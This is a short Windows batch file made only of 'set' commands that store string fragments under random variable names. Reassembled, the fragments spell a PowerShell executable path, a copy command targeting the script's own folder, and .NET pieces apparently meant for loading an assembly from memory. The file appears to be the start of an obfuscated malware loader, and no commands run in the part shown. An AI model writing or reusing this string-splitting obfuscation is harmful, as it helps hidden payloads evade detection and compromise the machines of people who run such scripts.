@echo off
set "KkPKIPyYlG=po"
set "gKiBmsRzeo=he"
set "sDIUfQfpIB=:\"
set "mbhYWaUqho=Wi"
set "QXvgeMYeTU=Sy"
set "SKDkgUbSmK=py"
set "GsViNELEHv=in"
set "jYnxEgPLCB=Po"
set "STjMOLnDuA= C"
set "UwlMeOktpH=st"
set "QEQaWgICQL=rS"
set "MzKsrcxbvg=ws"
set "ZmlRzJvTgk=em"
set "uRteRovxNg=ll"
set "zKTpfzcLIW=32"
set "zOFTmOBgTC=xe"
set "efwRHKclob=co"
set "PMjKxQMkQN=s\"
set "aHcwJSOoXf=.e"
set "qXOkvsAxGI=\W"
set "ErrucPAvLI=ll"
set "kEYGPiXDJN=we"
set "wyRNJpbIeq=ow"
set "crlkqFhmBx=\v"
set "ymUQvdpCbm=1."
set "vFEEblVJdW=nd"
set "YSwAMDpKtr=rs"
set "LNueiHBbyX= /"
set "uvdSMnxkiF=he"
set "rfXIujCVGF=do"
set "dUYKqNtHiU=y "
set "OydnFlZgPl=we"
set "tzbBRYkLjI=0\"
set "wCfuNUaUgo=cd"
set "TDpslahzXZ= %~dp0"
set "fAsRMqCACC=ojCz"
set "tGuxibXURd=Disp"
set "TCiQANQCbi=);$f"
set "quXELHuttK=('l0"
set "NIxgXCZNaz=m.IO"
set "CJqzyRKRjI=tsWi"
set "ijKscJhVJM=.Mem"
set "ZvIShqwDki=[]] "
set "bkQIdSkksa=e = "
set "MVIIvGOauw=();$"
set "PuApgvcPif=.Ass"
